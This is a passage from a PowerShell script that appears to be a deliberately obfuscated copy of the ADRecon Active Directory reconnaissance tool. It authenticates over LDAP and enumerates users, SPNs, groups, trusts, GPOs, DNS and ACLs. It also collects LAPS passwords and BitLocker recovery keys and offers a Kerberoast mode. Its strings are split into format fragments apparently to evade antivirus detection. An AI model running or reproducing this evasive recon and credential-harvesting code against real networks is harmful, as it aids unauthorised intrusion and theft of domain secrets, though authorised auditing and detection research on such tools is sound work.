                    ( (gI ("varIA"+"b"+"Le:Klq")  ).vaLue::("{0}{2}{3}{1}{4}" -f 'L','i','oad','W','thPartialName').Invoke(("{3}{0}{2}{5}{1}{4}" -f 'rec','er','tor','System.Di','vices','yS')))."L`ocAt`Ion"
                    ( $KlQ::("{1}{0}{3}{4}{2}"-f 'dW','Loa','Name','ithPa','rtial').Invoke(("{0}{2}{1}" -f 'Sys','L','tem.XM')))."Loc`A`TIoN"
                ))
            }
            Else
            {
                Add-Type -TypeDefinition $($LDAPSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    (  (VARIablE ('kL'+'Q')  -VAlueON )::("{0}{1}{5}{3}{2}{4}" -f'L','oadW','artialNam','P','e','ith').Invoke(("{5}{4}{1}{2}{0}{6}{3}{7}"-f'irector','.','D','Servi','m','Syste','y','ces')))."LOC`A`TIoN"
                    ( ( Dir  VaRIable:kLq  ).vAlue::("{0}{3}{5}{2}{4}{1}"-f 'Load','lName','Parti','W','a','ith').Invoke(("{1}{0}{2}" -f '.X','System','ML')))."LOcAT`i`oN"
                )) -Language ("{0}{2}{3}{1}" -f 'CSh','n3','arpVe','rsio')
            }
        }
    }
    Catch
    {
        Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
        Return $null
    }
    If ($SaveDebugPreference)
    {
        $script:DebugPreference = $SaveDebugPreference
        Remove-Variable ("{3}{2}{4}{0}{1}" -f 'ebugPre','ference','av','S','eD')
    }

    
    
    If (($Method -eq ("{0}{1}" -f 'LDA','P')) -and ($UseAltCreds) -and ($DomainController -eq "") -and ($Credential -eq   $K49p::"Em`PTY"))
    {
        Try
        {
            $objDomain = [ADSI]""
            If(!($objDomain."NA`mE"))
            {
                Write-Verbose ("{3}{5}{13}{9}{8}{2}{12}{10}{0}{4}{11}{1}{7}{6}"-f ', LD','cce','N','[Invoke-','AP bind','ADRec','ful','ss','U',' R','k',' Unsu','AS Chec','on]')
            }
            $UseAltCreds = $false
            $objDomain.("{1}{0}" -f 'spose','Di').Invoke()
        }
        Catch
        {
            $UseAltCreds = $true
        }
    }

    If ($UseAltCreds -and (($DomainController -eq "") -or ($Credential -eq  $k49P::"Emp`Ty")))
    {

        If (($DomainController -ne "") -and ($Credential -eq   (  gET-VarIABLe  K49p).VAluE::"E`mpTy"))
        {
            Try
            {
                $Credential = Get-Credential
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                Return $null
            }
        }
        Else
        {
            Write-Output ((("{12}{4}{16}{3}{9}{19}{8}{14}{7}{2}{17}{11}{10}{1}{0}{5}{18}{13}{6}{15}" -f'onal','i','e','e','n Get-Help .',' i','n','l','Ex','con.ps1 ','dit',' ad','Ru','matio','amp','.','ouOADR','s for','nfor','-'))  -rEplaCE 'ouO',[cHAR]92)
            Write-Output ("{6}{3}{8}{2}{18}{13}{0}{16}{5}{9}{12}{17}{7}{19}{10}{15}{1}{11}{14}{4}"-f ' ',' -Creden','ADRecon','Invok','r.','ainC','[','roll','e-','o','r ','tial pa','n','e','ramete','and','-Dom','t','] Use th','e')('
')
            Return $null
        }
    }

    Write-Output ('['+'*] '+'Ru'+'nning'+' '+'on'+' '+"$RanonComputer")

    Switch ($Collect)
    {
        ("{0}{1}" -f 'F','orest') { $ADRForest = $true }
        ("{2}{1}{0}" -f 'n','omai','D') {$ADRDomain = $true }
        ("{0}{2}{1}" -f'T','ts','rus') { $ADRTrust = $true }
        ("{0}{1}"-f 'Sit','es') { $ADRSite = $true }
        ("{1}{0}" -f 's','Subnet') { $ADRSubnet = $true }
        ("{1}{3}{0}{2}"-f 'Hi','Sc','story','hema') { $ADRSchemaHistory = $true }
        ("{3}{1}{0}{4}{2}" -f 'i','l','y','PasswordPo','c') { $ADRPasswordPolicy = $true }
        ("{4}{6}{1}{0}{2}{7}{5}{3}" -f 'd','e','Pass','Policy','FineGrai','ord','n','w') { $ADRFineGrainedPasswordPolicy = $true }
        ("{2}{0}{1}{3}"-f 'Con','troll','Domain','ers') { $ADRDomainControllers = $true }
        ("{0}{1}"-f'Us','ers') { $ADRUsers = $true }
        ("{2}{1}{0}" -f 's','erSPN','Us') { $ADRUserSPNs = $true }
        ("{5}{0}{4}{1}{2}{3}"-f'assw','i','b','utes','ordAttr','P') { $ADRPasswordAttributes = $true }
        ("{1}{0}" -f 's','Group') {$ADRGroups = $true }
        ("{2}{1}{0}{3}"-f 'ge','Chan','Group','s') { $ADRGroupChanges = $true }
        ("{2}{1}{0}"-f'rs','Membe','Group') { $ADRGroupMembers = $true }
        'OUs' { $ADROUs = $true }
        ("{0}{1}" -f 'G','POs') { $ADRGPOs = $true }
        ("{0}{1}"-f'gPLin','ks') { $ADRgPLinks = $true }
        ("{0}{1}{2}"-f'DNSZo','ne','s') { $ADRDNSZones = $true }
        ("{0}{1}{2}" -f'D','N','SRecords') { $ADRDNSRecords = $true }
        ("{1}{0}" -f'inters','Pr') { $ADRPrinters = $true }
        ("{2}{1}{0}"-f 'ers','t','Compu') { $ADRComputers = $true }
        ("{0}{2}{3}{1}" -f 'C','uterSPNs','om','p') { $ADRComputerSPNs = $true }
        ("{1}{0}"-f'PS','LA') { $ADRLAPS = $true }
        ("{0}{2}{1}{3}" -f'Bi','ke','tLoc','r') { $ADRBitLocker = $true }
        ("{1}{0}"-f's','ACL') { $ADRACLs = $true }
        ("{2}{0}{1}" -f'or','t','GPORep')
        {
            $ADRGPOReport = $true
            $ADRCreate = $true
        }
        ("{1}{0}{2}" -f'beroa','Ker','st') { $ADRKerberoast = $true }
        ("{8}{7}{3}{1}{0}{2}{6}{4}{5}" -f 'Se','untsusedfor','rvice','nAcco','ogo','n','L','omai','D') { $ADRDomainAccountsusedforServiceLogon = $true }
        ("{1}{2}{0}"-f't','Def','aul')
        {
            $ADRForest = $true
            $ADRDomain = $true
            $ADRTrust = $true
            $ADRSite = $true
            $ADRSubnet = $true
            $ADRSchemaHistory = $true
            $ADRPasswordPolicy = $true
            $ADRFineGrainedPasswordPolicy = $true
            $ADRDomainControllers = $true
            $ADRUsers = $true
            $ADRUserSPNs = $true
            $ADRPasswordAttributes = $true
            $ADRGroups = $true
            $ADRGroupMembers = $true
            $ADRGroupChanges = $true
            $ADROUs = $true
            $ADRGPOs = $true
            $ADRgPLinks = $true
            $ADRDNSZones = $true
            $ADRDNSRecords = $true
            $ADRPrinters = $true
            $ADRComputers = $true
            $ADRComputerSPNs = $true
            $ADRLAPS = $true
            $ADRBitLocker = $true
            
            $ADRGPOReport = $true
            
            

            If ($OutputType -eq ("{0}{1}"-f'Def','ault'))
            {
                [array] $OutputType = "CSV",("{1}{0}"-f'xcel','E')
            }
        }
    }

    Switch ($OutputType)
    {
        ("{1}{0}{2}" -f'T','S','DOUT') { $ADRSTDOUT = $true }
        'CSV'
        {
            $ADRCSV = $true
            $ADRCreate = $true
        }
        'XML'
        {
            $ADRXML = $true
            $ADRCreate = $true
        }
        ("{0}{1}"-f 'JSO','N')
        {
            $ADRJSON = $true
            $ADRCreate = $true
        }
        ("{1}{0}"-f 'ML','HT')
        {
            $ADRHTML = $true
            $ADRCreate = $true
        }
        ("{0}{1}"-f'Exc','el')
        {
            $ADRExcel = $true
            $ADRCreate = $true
        }
        'All'
        {
            
            $ADRCSV = $true
            $ADRXML = $true
            $ADRJSON = $true
            $ADRHTML = $true
            $ADRExcel = $true
            $ADRCreate = $true
            [array] $OutputType = "CSV","XML",("{0}{1}"-f 'J','SON'),("{1}{0}" -f'TML','H'),("{1}{0}" -f 'xcel','E')
        }
        ("{0}{1}{2}"-f'De','fau','lt')
        {
            [array] $OutputType = {"{0}{2}{1}"-f 'S','DOUT','T'}
            $ADRSTDOUT = $true
        }
    }

    If ( ($ADRExcel) -and (-Not $ADRCSV) )
    {
        $ADRCSV = $true
        [array] $OutputType += "CSV"
    }

    $returndir = Get-Location
    $date = Get-Date

    
    If ( ($ADROutputDir) -and ($ADRCreate) )
    {
        If (!(Test-Path $ADROutputDir))
        {
            New-Item $ADROutputDir -type ("{3}{2}{1}{0}" -f'ry','o','ect','dir') | Out-Null
            If (!(Test-Path $ADROutputDir))
            {
                Write-Output ("{2}{10}{4}{1}{3}{6}{5}{11}{8}{7}{0}{12}{9}" -f ' Exit','r','[Invoke-A','or, in','econ] Er','tDi','valid Outpu','.',' ..','g','DR','r Path','in')
                Return $null
            }
        }
        $ADROutputDir = $((Convert-Path $ADROutputDir).("{0}{2}{1}" -f'T','mEnd','ri').Invoke("\"))
        Write-Verbose ('[*]'+' '+'Ou'+'tpu'+'t '+'Director'+'y'+': '+"$ADROutputDir")
    }
    ElseIf ($ADRCreate)
    {
        $ADROutputDir =  -join($returndir,'\',("{2}{1}{0}"-f 'ort-','con-Rep','ADRe'),$(Get-Date -UFormat ("{0}{2}{1}" -f'%','%m%d%H%M%S','Y')))
        New-Item $ADROutputDir -type ("{2}{1}{0}"-f 'y','r','directo') | Out-Null
        If (!(Test-Path $ADROutputDir))
        {
            Write-Output ("{1}{2}{5}{13}{7}{10}{11}{9}{4}{3}{8}{0}{12}{6}"-f'utpu','[Invok','e','re',' not c','-ADR','ry','E','ate o','d','rror',', coul','t directo','econ] ')
            Return $null
        }
        $ADROutputDir = $((Convert-Path $ADROutputDir).("{0}{1}"-f 'T','rimEnd').Invoke("\"))
        Remove-Variable ("{2}{0}{1}" -f 'e','ate','ADRCr')
    }
    Else
    {
        $ADROutputDir = $returndir
    }

    If ($ADRCSV)
    {
        $CSVPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',("{1}{0}" -f'Files','CSV-'))
        New-Item $CSVPath -type ("{1}{2}{0}" -f'ry','dir','ecto') | Out-Null
        If (!(Test-Path $CSVPath))
        {
            Write-Output ("{0}{12}{9}{2}{11}{5}{8}{3}{4}{7}{13}{10}{1}{6}" -f'[','ut dire','ok','u','ld not c','econ] ','ctory','reate','Error, co','nv','utp','e-ADR','I',' o')
            Return $null
        }
        Remove-Variable ("{1}{0}"-f'RCSV','AD')
    }

    If ($ADRXML)
    {
        $XMLPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',("{2}{1}{0}" -f 'iles','ML-F','X'))
        New-Item $XMLPath -type ("{0}{2}{3}{1}" -f 'd','ory','i','rect') | Out-Null
        If (!(Test-Path $XMLPath))
        {
            Write-Output ("{1}{7}{5}{2}{4}{6}{9}{0}{8}{3}"-f ' output','[I','con','ry','] Error, could not','e-ADRe',' ','nvok',' directo','create')
            Return $null
        }
        Remove-Variable ("{1}{2}{0}" -f'XML','A','DR')
    }

    If ($ADRJSON)
    {
        $JSONPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',("{1}{2}{0}" -f 'les','JSO','N-Fi'))
        New-Item $JSONPath -type ("{1}{0}{2}"-f 'recto','di','ry') | Out-Null
        If (!(Test-Path $JSONPath))
        {
            Write-Output ("{3}{4}{10}{11}{9}{5}{8}{6}{7}{12}{2}{0}{1}"-f'o','ry','ct','[Inv','oke-ADRecon','r, coul',' not cre','ate outp','d','rro',']',' E','ut dire')
            Return $null
        }
        Remove-Variable ("{0}{1}"-f 'A','DRJSON')
    }

    If ($ADRHTML)
    {
        $HTMLPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',("{1}{2}{0}"-f'les','HTML-F','i'))
        New-Item $HTMLPath -type ("{0}{3}{2}{1}" -f 'd','tory','rec','i') | Out-Null
        If (!(Test-Path $HTMLPath))
        {
            Write-Output ("{1}{9}{11}{6}{0}{10}{2}{8}{4}{5}{7}{3}"-f '] Error, co','[Invo','ld no','irectory',' create',' ','on','output d','t','ke-A','u','DRec')
            Return $null
        }
        Remove-Variable ("{0}{1}" -f'ADR','HTML')
    }

    
    If ($UseAltCreds -and ($Method -eq ("{1}{0}"-f 'DWS','A')))
    {
        If (!(Test-Path ("{0}{1}" -f 'AD','R:')))
        {
            Try
            {
                New-PSDrive -PSProvider ("{2}{1}{3}{0}" -f'ectory','eDi','Activ','r') -Name ("{0}{1}"-f'AD','R') -Root "" -Server $DomainController -Credential $Credential -ErrorAction ("{1}{0}" -f'op','St') | Out-Null
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Else
        {
            Remove-PSDrive ("{1}{0}"-f 'DR','A')
            Try
            {
                New-PSDrive -PSProvider ("{2}{3}{4}{0}{1}"-f 'c','tory','Active','Di','re') -Name ("{0}{1}"-f'A','DR') -Root "" -Server $DomainController -Credential $Credential -ErrorAction ("{1}{0}" -f'op','St') | Out-Null
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Set-Location ("{1}{0}"-f'DR:','A')
        Write-Debug ("{2}{3}{1}{0}"-f 'reated','C','A','DR PSDrive ')
    }

    If ($Method -eq ("{0}{1}" -f'L','DAP'))
    {
        If ($UseAltCreds)
        {
            Try
            {
                $objDomain = New-Object ("{5}{4}{0}{6}{2}{1}{7}{3}"-f 'e','ce','i','ctoryEntry','yst','S','m.DirectoryServ','s.Dire') "LDAP://$($DomainController)", $Credential."uSeRn`AMe",$Credential.("{2}{1}{0}{3}{4}"-f 'rkC','Netwo','Get','re','dential').Invoke()."pa`ssWO`Rd"
                $objDomainRootDSE = New-Object ("{0}{9}{5}{6}{10}{7}{4}{2}{1}{11}{3}{8}"-f 'System.Di','ect','ir','yEn','.D','S','erv','ces','try','rectory','i','or') "LDAP://$($DomainController)/RootDSE", $Credential."User`NA`me",$Credential.("{5}{0}{4}{3}{2}{6}{1}" -f 'tNetw','al','d','Cre','ork','Ge','enti').Invoke()."PAss`worD"
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
            If(!($objDomain."n`AmE"))
            {
                Write-Output ("{2}{4}{0}{3}{6}{1}{7}{5}{8}"-f'c','nd','[Inv','on]','oke-ADRe','ucc',' LDAP bi',' Uns','essful')
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
            Else
            {
                Write-Output ("{2}{0}{5}{1}{4}{3}"-f'*] ','P bi','[',' Successful','nd','LDA')
            }
        }
        Else
        {
            $objDomain = [ADSI]""
            $objDomainRootDSE = ([ADSI] ("{2}{1}{0}" -f'otDSE','/Ro','LDAP:/'))
            If(!($objDomain."NA`ME"))
            {
                Write-Output ("{7}{8}{0}{3}{10}{4}{5}{2}{1}{9}{6}"-f'ke-ADRe','u','ns','co','bi','nd U','ssful','[In','vo','cce','n] LDAP ')
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Write-Debug ("{1}{0}{3}{2}" -f 'ing Su','LDAP B','essful','cc')
    }

    Write-Output ('[*'+'] '+'Co'+'mmen'+'cing '+'- '+"$date")
    If ($ADRDomain)
    {
        Write-Output ("{1}{2}{0}"-f 'Domain','[-','] ')
        $ADRObject = Get-ADRDomain -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}" -f 'Dom','ain')
            Remove-Variable ("{1}{2}{0}" -f't','A','DRObjec')
        }
        Remove-Variable ("{0}{1}{2}"-f'ADRDo','ma','in')
    }
    If ($ADRForest)
    {
        Write-Output ("{1}{3}{0}{2}" -f'or','[-] ','est','F')
        $ADRObject = Get-ADRForest -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}" -f 'Fores','t')
            Remove-Variable ("{2}{1}{0}{3}"-f'jec','DROb','A','t')
        }
        Remove-Variable ("{2}{0}{1}" -f 's','t','ADRFore')
    }
    If ($ADRTrust)
    {
        Write-Output ("{1}{2}{0}" -f's','[-','] Trust')
        $ADRObject = Get-ADRTrust -Method $Method -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{2}{0}{1}" -f't','s','Trus')
            Remove-Variable ("{2}{0}{1}"-f 'RObj','ect','AD')
        }
        Remove-Variable ("{0}{1}{2}" -f 'A','DRTru','st')
    }
    If ($ADRSite)
    {
        Write-Output ("{0}{1}"-f '[-','] Sites')
        $ADRObject = Get-ADRSite -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}"-f 'Si','tes')
            Remove-Variable ("{1}{0}{2}"-f'je','ADROb','ct')
        }
        Remove-Variable ("{1}{2}{0}" -f'e','A','DRSit')
    }
    If ($ADRSubnet)
    {
        Write-Output ("{0}{1}{2}" -f '[-','] Sub','nets')
        $ADRObject = Get-ADRSubnet -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}" -f 'Subne','ts')
            Remove-Variable ("{1}{2}{0}{3}" -f'c','ADRO','bje','t')
        }
        Remove-Variable ("{2}{1}{0}"-f'et','n','ADRSub')
    }
    If ($ADRSchemaHistory)
    {
        Write-Output ("{1}{0}{5}{6}{2}{4}{3}"-f'Hist','[-] Schema',' so','time','me ','ory - May',' take')
        $ADRObject = Get-ADRSchemaHistory -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{2}{0}" -f 'tory','S','chemaHis')
            Remove-Variable ("{2}{0}{3}{1}"-f'D','ct','A','RObje')
        }
        Remove-Variable ("{2}{3}{4}{0}{1}" -f 'or','y','ADRSche','m','aHist')
    }
    If ($ADRPasswordPolicy)
    {
        Write-Output ("{0}{4}{2}{1}{3}{5}"-f '[-','efault ',' D','Passwo',']','rd Policy')
        $ADRObject = Get-ADRDefaultPasswordPolicy -Method $Method -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}{3}{2}{4}{5}{6}"-f'Defa','u','a','ltP','s','s','wordPolicy')
            Remove-Variable ("{0}{2}{1}" -f 'ADR','bject','O')
        }
        Remove-Variable ("{0}{1}{3}{2}"-f 'ADR','Pass','ordPolicy','w')
    }
    If ($ADRFineGrainedPasswordPolicy)
    {
        Write-Output ("{2}{8}{6}{10}{1}{14}{3}{12}{5}{4}{13}{7}{9}{0}{11}{15}"-f'd A','Pa','[-] Fine Gra','cy - ','i','Pr','e','ileg','in','e','d ','cc','May need a ','v','ssword Poli','ount')
        $ADRObject = Get-ADRFineGrainedPasswordPolicy -Method $Method -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{3}{0}{4}{2}{1}{5}"-f 'Grain','ordPolic','w','Fine','edPass','y')
            Remove-Variable ("{0}{2}{1}" -f'A','Object','DR')
        }
        Remove-Variable ("{2}{0}{5}{1}{3}{4}" -f'Grai','edPass','ADRFine','word','Policy','n')
    }
    If ($ADRDomainControllers)
    {
        Write-Output ("{0}{2}{3}{1}{4}"-f '[','in Controlle','-','] Doma','rs')
        $ADRObject = Get-ADRDomainController -Method $Method -objDomain $objDomain -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{2}{1}{3}" -f 'Domai','tro','nCon','llers')
            Remove-Variable ("{1}{0}{2}"-f 'D','A','RObject')
        }
        Remove-Variable ("{0}{2}{3}{1}"-f'ADR','rs','D','omainControlle')
    }
    If ($ADRUsers -or $ADRUserSPNs)
    {
        If (!$ADRUserSPNs)
        {
            Write-Output ("{5}{0}{3}{6}{2}{4}{1}{7}" -f's ','e','ay ta','- ','k','[-] User','M',' some time')
            $ADRUserSPNs = $false
        }
        ElseIf (!$ADRUsers)
        {
            Write-Output ("{1}{2}{0}" -f ' SPNs','[-','] User')
            $ADRUsers = $false
        }
        Else
        {
            Write-Output ("{6}{4}{1}{2}{3}{0}{5}" -f'im','nd SPN','s - May take ','some t','-] Users a','e','[')
        }
        Get-ADRUser -Method $Method -date $date -objDomain $objDomain -DormantTimeSpan $DormantTimeSpan -PageSize $PageSize -Threads $Threads -ADRUsers $ADRUsers -ADRUserSPNs $ADRUserSPNs
        Remove-Variable ("{0}{1}{2}" -f'ADRU','s','ers')
        Remove-Variable ("{3}{2}{0}{1}" -f'P','Ns','rS','ADRUse')
    }
    If ($ADRPasswordAttributes)
    {
        Write-Output ("{0}{5}{2}{8}{9}{3}{4}{7}{1}{6}"-f'[','peri','a','u','tes -','-] P','mental',' Ex','sswor','dAttrib')
        $ADRObject = Get-ADRPasswordAttributes -Method $Method -objDomain $objDomain -PageSize $PageSize
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{3}{4}{5}{1}{2}"-f'Passw','t','es','o','rdAttri','bu')
            Remove-Variable ("{0}{3}{2}{1}" -f 'ADRObj','t','c','e')
        }
        Remove-Variable ("{2}{0}{1}{4}{3}{5}{6}" -f'DRPas','sw','A','rdAttribu','o','t','es')
    }
    If ($ADRGroups -or $ADRGroupChanges)
    {
        If (!$ADRGroupChanges)
        {
            Write-Output ("{6}{1}{4}{3}{7}{5}{2}{8}{0}" -f'e time','] Grou','o','-','ps ','s','[-',' May take ','m')
            $ADRGroupChanges = $false
        }
        ElseIf (!$ADRGroups)
        {
            Write-Output ("{6}{5}{1}{10}{11}{7}{3}{2}{4}{9}{0}{8}"-f'ay take some','e','s','Change',' -','oup M','[-] Gr','p ',' time',' M','mbers','hi')
            $ADRGroups = $false
        }
        Else
        {
            Write-Output ("{3}{6}{7}{2}{0}{1}{8}{5}{9}{4}"-f'ership',' ',' and Memb','[-',' time',' M','] Gro','ups','Changes -','ay take some')
        }
        Get-ADRGroup -Method $Method -date $date -objDomain $objDomain -PageSize $PageSize -Threads $Threads -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRGroups $ADRGroups -ADRGroupChanges $ADRGroupChanges
        Remove-Variable ("{2}{0}{3}{1}"-f 'Gr','ups','ADR','o')
        Remove-Variable ("{1}{3}{0}{2}" -f 'upChang','AD','es','RGro')
    }
    If ($ADRGroupMembers)
    {
        Write-Output ("{1}{6}{3}{5}{7}{9}{10}{2}{4}{0}{8}"-f 'm','[-] G','me ','mb','ti','ers','roup Me','hips','e',' -',' May take so')

        $ADRObject = Get-ADRGroupMember -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{3}{0}{2}{1}" -f 'roup','ers','Memb','G')
            Remove-Variable ("{0}{2}{1}" -f'A','ect','DRObj')
        }
        Remove-Variable ("{0}{1}{2}"-f'ADR','Gr','oupMembers')
    }
    If ($ADROUs)
    {
        Write-Output (("{2}{3}{6}{4}{5}{7}{1}{0}" -f'OUs)','ts (','[-] O','rg','tiona','lUn','aniza','i'))
        $ADRObject = Get-ADROU -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "OUs"
            Remove-Variable ("{0}{1}{2}" -f 'AD','RObj','ect')
        }
        Remove-Variable ("{0}{1}"-f 'AD','ROUs')
    }
    If ($ADRGPOs)
    {
        Write-Output ("{1}{0}{2}" -f '-]','[',' GPOs')
        $ADRObject = Get-ADRGPO -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}" -f 's','GPO')
            Remove-Variable ("{0}{2}{1}"-f'ADROb','ect','j')
        }
        Remove-Variable ("{1}{0}"-f 'Os','ADRGP')
    }
    If ($ADRgPLinks)
    {
        Write-Output (("{3}{2}{6}{0}{4}{7}{1}{5}" -f 'a','M','Links - Sco','[-] gP','na',')','pe of M','gement (SO'))
        $ADRObject = Get-ADRgPLink -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{2}{1}{0}"-f's','Link','gP')
            Remove-Variable ("{1}{0}"-f 't','ADRObjec')
        }
        Remove-Variable ("{0}{1}{2}" -f 'A','DRgPLin','ks')
    }
    If ($ADRDNSZones -or $ADRDNSRecords)
    {
        If (!$ADRDNSRecords)
        {
            Write-Output ("{1}{0}{2}" -f 'e','[-] DNS Zon','s')
            $ADRDNSRecords = $false
        }
        ElseIf (!$ADRDNSZones)
        {
            Write-Output ("{0}{1}{2}"-f'[-] DN','S Record','s')
            $ADRDNSZones = $false
        }
        Else
        {
            Write-Output ("{4}{1}{0}{5}{2}{3}{6}" -f 'D','] ',' Zo','nes and Reco','[-','NS','rds')
        }
        Get-ADRDNSZone -Method $Method -objDomain $objDomain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRDNSZones $ADRDNSZones -ADRDNSRecords $ADRDNSRecords
        Remove-Variable ("{0}{1}{2}" -f 'ADRDN','SZo','nes')
    }
    If ($ADRPrinters)
    {
        Write-Output ("{1}{0}{2}" -f 'nt','[-] Pri','ers')
        $ADRObject = Get-ADRPrinter -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}{2}" -f'nte','Pri','rs')
            Remove-Variable ("{2}{0}{1}" -f'O','bject','ADR')
        }
        Remove-Variable ("{1}{2}{0}{3}" -f'ter','ADR','Prin','s')
    }
    If ($ADRComputers -or $ADRComputerSPNs)
    {
        If (!$ADRComputerSPNs)
        {
            Write-Output ("{5}{4}{2}{1}{3}{8}{0}{6}{7}" -f 'May take s','r','e','s ','omput','[-] C','ome ','time','- ')
            $ADRComputerSPNs = $false
        }
        ElseIf (!$ADRComputers)
        {
            Write-Output ("{4}{2}{3}{1}{5}{0}"-f'Ns','te','mp','u','[-] Co','r SP')
            $ADRComputers = $false
        }
        Else
        {
            Write-Output ("{7}{1}{6}{0}{4}{2}{5}{3}" -f' and SPNs ','] Compute','e ','e','- May take som','tim','rs','[-')
        }
        Get-ADRComputer -Method $Method -date $date -objDomain $objDomain -DormantTimeSpan $DormantTimeSpan -PassMaxAge $PassMaxAge -PageSize $PageSize -Threads $Threads -ADRComputers $ADRComputers -ADRComputerSPNs $ADRComputerSPNs
        Remove-Variable ("{0}{2}{3}{1}" -f'ADR','ers','Comp','ut')
        Remove-Variable ("{3}{0}{4}{2}{1}"-f 'D','SPNs','er','A','RComput')
    }
    If ($ADRLAPS)
    {
        Write-Output ("{5}{7}{2}{1}{0}{8}{3}{4}{6}" -f'eds Pri','Ne',' ','ile','ge','[-] LAPS','d Account',' -','v')
        $ADRObject = Get-ADRLAPSCheck -Method $Method -objDomain $objDomain -PageSize $PageSize -Threads $Threads
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}"-f'APS','L')
            Remove-Variable ("{2}{0}{1}"-f'bje','ct','ADRO')
        }
        Remove-Variable ("{1}{2}{0}"-f 'APS','AD','RL')
    }
    If ($ADRBitLocker)
    {
        Write-Output ("{6}{2}{11}{8}{9}{5}{1}{10}{3}{7}{0}{4}" -f 'e','- ','cker Rec','s Pri','d Account',' ','[-] BitLo','vileg','very Key','s','Need','o')
        $ADRObject = Get-ADRBitLocker -Method $Method -objDomain $objDomain -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}{5}{4}{3}{6}{2}"-f'Bi','tL','s','ove','erRec','ock','ryKey')
            Remove-Variable ("{3}{1}{2}{0}"-f 'ect','DR','Obj','A')
        }
        Remove-Variable ("{3}{2}{1}{0}"-f 'er','k','Loc','ADRBit')
    }
    If ($ADRACLs)
    {
        Write-Output ("{0}{3}{5}{2}{6}{1}{4}" -f'[','ome t','- May','-] ACL','ime','s ',' take s')
        $ADRObject = Get-ADRACL -Method $Method -objDomain $objDomain -DomainController $DomainController -Credential $Credential -PageSize $PageSize -Threads $Threads
        Remove-Variable ("{1}{2}{0}" -f 'RACLs','A','D')
    }
    If ($ADRGPOReport)
    {
